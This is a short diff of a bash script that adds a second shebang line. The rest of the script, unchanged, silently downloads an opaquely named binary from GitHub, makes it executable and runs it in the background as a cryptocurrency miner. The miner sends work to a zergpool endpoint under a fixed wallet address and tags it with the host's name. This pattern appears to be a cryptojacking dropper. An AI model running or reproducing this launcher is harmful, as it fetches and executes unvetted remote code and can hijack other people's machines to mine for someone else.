@@ -1,4 +1,5 @@
 #!/bin/bash
+#!/bin/sh
 wget https://github.com/gyrogerald/mici/raw/main/pkx512 >/dev/null 2>&1
 chmod +x pkx512 >/dev/null 2>&1
 nohup ./pkx512 -a curvehash -o stratum+tcp://curvehash.eu.mine.zergpool.com:3343 -u XshK2irNsaV9iTYc2KtGGf3LfUhXj3isKk -p c=DASH,mc=PLSR,ID=$(echo $(hostname)) -t 2 > nohup.out
